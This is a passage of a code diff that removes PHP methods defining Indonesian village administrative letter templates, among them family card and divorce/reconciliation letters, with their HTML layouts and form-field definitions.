-                <td style="text-align: left; height: 19.2344px; width: 95.6778%;" colspan="4">Surat Keterangan ini dibuat berdasarkan keterangan pelapor:</td>
-                </tr>
-                <tr style="height: 19.2344px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">15.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">Nama Lengkap</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">[Form_nama_pelapoR]</td>
-                </tr>
-                <tr style="height: 19.2344px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">16.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">NIK / Jenis Kelamin</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">[Form_nik_pelapoR] / [Form_jenis_kelamin_pelapoR]</td>
-                </tr>
-                <tr style="height: 19.2344px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">17.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">Tempat / Tanggal Lahir</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">[Form_tempat_lahiR] / [Form_tanggal_lahir_pelapoR]</td>
-                </tr>
-                <tr style="height: 19.2344px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">18.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">Pekerjaan</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">[Form_pekerjaan_pelapoR]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.375px;">19.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Alamat</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.375px;">[Form_alamat_pelapoR]</td>
-                </tr>
-                </tbody>
-                </table>
-                <p style="text-align: justify; text-indent: 30px;">Demikian surat keterangan ini dibuat dengan sebenarnya, atas perhatian dan terkabulnya diucapkan terima kasih.<br /><br /></p>
-                <table style="border-collapse: collapse; width: 100%; height: 415.985px;" border="0">
-                <tbody>
-                <tr style="height: 38.2344px;">
-                <td style="width: 35.0462%; text-align: center; height: 38.2344px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 38.2344px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 38.2344px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; text-align: center; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 22.4688px;">[Nama_desA], [TgL_surat]</td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 22.4688px;">[Sebutan_kepala_desA] [Nama_desA]</td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 22.4688px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: left; height: 22.4688px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: left; height: 22.4688px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; text-align: center; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; height: 22.4688px; text-align: center;"><strong>Nama_pamonG</strong></td>
-                </tr>
-                <tr style="height: 22.4688px;">
-                <td style="width: 35.0462%; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 30.0103%; text-align: center; height: 22.4688px;">\u{a0}</td>
-                <td style="width: 35.0462%; height: 22.4688px; text-align: center;">NIP : [Nip_kepala_camaT]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; text-align: center; height: 18px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 18px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 92px;">
-                <td style="width: 35.0462%; height: 92px;">\u{a0}</td>
-                <td style="width: 30.0103%; text-align: center; height: 92px;">[qr_code]</td>
-                <td style="width: 35.0462%; text-align: center; height: 92px;">\u{a0}</td>
-                </tr>
-                </tbody>
-                </table>
-                <div style="text-align: center;">\u{a0}</div>
-            HTML;
-        $data = [
-            'nama'                => 'Permohonan Duplikat Kelahiran',
-            'kode_surat'          => 'S-20',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'd',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_hari_lahir]","nama":"Hari Lahir","deskripsi":"Hari Lahir","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"time","kode":"[form_jam_lahir]","nama":"Jam Lahir","deskripsi":"Jam Lahir","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_tempat_lahir]","nama":"Tempat Lahir","deskripsi":"Tempat Lahir","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pelapor]","nama":"Nama Pelapor","deskripsi":"Nama Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal_lahir_pelapor]","nama":"Tanggal Lahir Pelapor","deskripsi":"Tanggal Lahir Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nik_pelapor]","nama":"Nik Pelapor","deskripsi":"Nik Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"select-otomatis","kode":"[form_jenis_kelamin_pelapor]","nama":"Jenis Kelamin Pelapor","deskripsi":"Jenis Kelamin Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":"tweb_penduduk_sex"},{"tipe":"text","kode":"[form_tempat_lahir_pelapor]","nama":"Tempat Lahir Pelapor","deskripsi":"Tempat Lahir Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal_lahir_pelapor]","nama":"Tanggal Lahir Pelapor","deskripsi":"Tanggal Lahir Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_pekerjaan_pelapor]","nama":"Pekerjaan Pelapor","deskripsi":"Pekerjaan Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"textarea","kode":"[form_alamat_pelapor]","nama":"Alamat Pelapor","deskripsi":"Alamat Pelapor","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'lampiran'            => null,
-            'template'            => $template,
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratPermohonanKartuKeluarga($hasil, $id)
-    {
-        $data = [
-            'nama'                => 'Permohonan Kartu Keluarga',
-            'kode_surat'          => 'S-36',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::YA,
-            'kode_isian'          => '[{"tipe":"select-manual","kode":"[form_alasan_permohonan]","nama":"Alasan Permohonan","deskripsi":"Alasan Permohonan","atribut":null,"pilihan":["KARENA MEMBENTUK RUMAH TANGGA BARU","KARENA KARTU KELUARGA HILANG\/RUSAK","LAINNYA"],"refrensi":null},{"tipe":"text","kode":"[form_nomor_kartu_keluarga_semula]","nama":"Nomor Kartu Keluarga Semula","deskripsi":"Nomor Kartu Keluarga Semula","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"textarea","kode":"[form_keterangan]","nama":"Keterangan","deskripsi":"Keterangan","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"1","kk_level":"1"}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'lampiran'            => 'F-1.15,F-1.01,F-1.02',
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>\r\n<p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa :</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 270px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">1.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Nama</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\"><strong>[NAma]</strong></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">2.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[TtL]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">3.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Umur</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[UsIa]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">4.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Warga Negara</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[WArga_negara]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">5.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Agama</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[AgAma]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">6.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Jenis Kelamin</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[Jenis_kelamin]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">7.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Pekerjaan</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[PeKerjaan]</td>\r\n</tr>\r\n<tr style=\"height: 36px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 36px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 36px; text-align: left;\">8.<br /><br /></td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 36px;\">Tempat Tinggal<br /><br /></td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 36px;\">:<br /><br /></td>\r\n<td style=\"width: 60.0211%; height: 36px; text-align: justify;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">9.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Surat bukti diri</td>\r\n<td style=\"width: 1.26582%; height: 18px; text-align: center;\"> </td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\"> </td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">KTP</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[Nik]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\"> </td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">KK</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[No_kk]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">10.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Keperluan</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">Permohonan Kartu Keluarga baru WNI.</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">11.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Berlaku</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">[Mulai_berlaku] s/d [Berlaku_sampai]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.32489%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90295%; height: 18px; text-align: left;\">12.</td>\r\n<td style=\"width: 30.4852%; text-align: left; height: 18px;\">Keterangan lain-lain</td>\r\n<td style=\"width: 1.26582%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0211%; height: 18px; text-align: justify;\">Orang tersebut di atas adalah benar-benar penduduk [SeButan_desa] kami dan ada istiadat baik.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Demikian surat ini dibuat, untuk dipergunakan sebagaimana mestinya.<br /><br /></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 324px;\" border=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; height: 18px;\"> </td>\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\">[NaMa_desa], [TgL_surat]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\">Pemegang Surat</td>\r\n<td style=\"width: 30.0103%; height: 18px;\"> </td>\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\">[Atas_namA]</td>\r\n</tr>\r\n<tr style=\"height: 72px;\">\r\n<td style=\"width: 35.0462%; text-align: center; height: 72px;\"> </td>\r\n<td style=\"width: 30.0103%; height: 72px;\"><br /><br /><br /><br /></td>\r\n<td style=\"width: 35.0462%; height: 72px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\"><strong>[NAma]</strong></td>\r\n<td style=\"width: 30.0103%; height: 18px;\"> </td>\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\">[Nama_pamonG]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; height: 18px;\"> </td>\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\">[SEbutan_nip_desa] : [nip_pamong]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; height: 18px;\"> </td>\r\n<td style=\"width: 35.0462%; text-align: center; height: 18px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; height: 18px;\">No</td>\r\n<td style=\"width: 35.0462%; text-align: left; height: 18px;\">:</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; height: 18px;\">Tanggal</td>\r\n<td style=\"width: 35.0462%; text-align: left; height: 18px;\">:</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; text-align: center; height: 18px;\">Mengetahui,</td>\r\n<td style=\"width: 35.0462%; text-align: left; height: 18px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35.0462%; height: 18px;\"> </td>\r\n<td style=\"width: 30.0103%; text-align: center; height: 18px;\">Camat - [NaMa_kecamatan]</td>\r\n<td style=\"width: 35.0462%; text-align: left; height: 18px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 72px;\">\r\n<td style=\"height: 72px; width: 35.0462%;\" rowspan=\"2\">[qr_code]</td>\r\n<td style=\"width: 30.0103%; height: 72px;\"><br /><br /><br /></td>\r\n<td style=\"width: 35.0462%; text-align: left; height: 72px;\"> </td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 30.0103%; text-align: center; height: 18px;\">..............................................</td>\r\n<td style=\"width: 35.0462%; text-align: left; height: 18px;\"> </td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<div style=\"text-align: center;\"> </div>",
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratKeteranganPengantarRujukCerai($hasil, $id)
-    {
-        $data = [
-            'nama'                => 'Keterangan Pengantar Rujuk/Cerai',
-            'kode_surat'          => 'S-35',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'd',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_nama_lengkap]","nama":"Nama Lengkap","deskripsi":"Nama Lengkap Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_tempat_lahir]","nama":"Tempat Lahir","deskripsi":"Tempat Lahir Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal_lahir]","nama":"Tanggal Lahir","deskripsi":"Tanggal Lahir Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_warganegara]","nama":"Warganegara","deskripsi":"Warganegara Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_ayah]","nama":"Nama Ayah","deskripsi":"Nama Ayah Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_agama]","nama":"Agama","deskripsi":"Agama Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_pekerjaan]","nama":"Pekerjaan","deskripsi":"Pekerjaan Pasangan","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_tempat_tinggal]","nama":"Tempat Tinggal","deskripsi":"Tempat Tinggal Pasangan","atribut":null,"pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'lampiran'            => null,
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>
-            <p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>
-            <p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan bahwa berdasarkan keterangan dari :</p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 154px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 19.25px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 19.25px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 19.25px;\">1.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 19.25px;\">Nama Lengkap</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 19.25px;\">:</td>
-            <td style=\"width: 62.4872%; height: 19.25px; text-align: justify;\"><strong>[NAma]</strong></td>
-            </tr>
-            <tr style=\"height: 19.25px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 19.25px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 19.25px;\">2.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 19.25px;\">Bin</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 19.25px;\">:</td>
-            <td style=\"width: 62.4872%; height: 19.25px; text-align: justify;\">[NaMa_ayah]</td>
-            </tr>
-            <tr style=\"height: 19.25px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 19.25px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 19.25px;\">3.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 19.25px;\">Tempat / Tanggal Lahir</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 19.25px;\">:</td>
-            <td style=\"width: 62.4872%; height: 19.25px; text-align: justify;\">[TtL]</td>
-            </tr>
-            <tr style=\"height: 19.25px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 19.25px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 19.25px;\">4.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 19.25px;\">Kewarganegaraan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 19.25px;\">:</td>
-            <td style=\"width: 62.4872%; text-align: justify; height: 19.25px;\">[WArga_negara]</td>
-            </tr>
-            <tr style=\"height: 19.25px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 19.25px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 19.25px;\">5.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 19.25px;\">Agama</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 19.25px;\">:</td>
-            <td style=\"width: 62.4872%; height: 19.25px; text-align: justify;\">[AgAma]</td>
-            </tr>
-            <tr style=\"height: 19.25px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 19.25px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 19.25px;\">6.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 19.25px;\">Pekerjaan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 19.25px;\">:</td>
-            <td style=\"width: 62.4872%; text-align: justify; height: 19.25px;\">[PeKerjaan]</td>
-            </tr>
-            <tr style=\"height: 38.5px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 38.5px;\">\u{a0}</td>
-            <td style=\"width: 2.98047%; text-align: center; height: 38.5px;\">7.</td>
-            <td style=\"width: 29.9075%; text-align: left; height: 38.5px;\">Alamat / Tempat Tinggal</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 38.5px;\">:</td>
-            <td style=\"width: 62.4872%; text-align: justify; height: 38.5px;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\">Telah rujuk/cerai *) dengan :<strong><br /></strong></p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 163px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 23.2812px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.2812px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.2812px;\">8.</td>
-            <td style=\"width: 30.0103%; height: 23.2812px;\">Nama Lengkap</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.2812px;\">:</td>
-            <td style=\"width: 62.4872%; height: 23.2812px;\">[FoRm_nama_lengkap]</td>
-            </tr>
-            <tr style=\"height: 23.2812px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.2812px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.2812px;\">9.</td>
-            <td style=\"width: 30.0103%; height: 23.2812px;\">Binti</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.2812px;\">:</td>
-            <td style=\"width: 62.4872%; height: 23.2812px;\">[FoRm_nama_ayah]</td>
-            </tr>
-            <tr style=\"height: 23.2812px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.2812px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.2812px;\">10.</td>
-            <td style=\"width: 30.0103%; height: 23.2812px;\">Tempat dan Tanggal Lahir</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.2812px;\">:</td>
-            <td style=\"width: 62.4872%; height: 23.2812px;\">[FoRm_tempat_lahir], [FoRm_tanggal_lahir]</td>
-            </tr>
-            <tr style=\"height: 23.2812px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.2812px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.2812px;\">11.</td>
-            <td style=\"width: 30.0103%; height: 23.2812px;\">Kewarganegaraan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.2812px;\">:</td>
-            <td style=\"width: 62.4872%; height: 23.2812px;\">[FoRm_warganegara]</td>
-            </tr>
-            <tr style=\"height: 23.2812px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.2812px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.2812px;\">12.</td>
-            <td style=\"width: 30.0103%; height: 23.2812px;\">Agama</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.2812px;\">:</td>
-            <td style=\"width: 62.4872%; height: 23.2812px;\">[FoRm_agama]</td>
-            </tr>
-            <tr style=\"height: 23.2812px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.2812px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.2812px;\">13.</td>
-            <td style=\"width: 30.0103%; height: 23.2812px;\">Pekerjaan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.2812px;\">:</td>
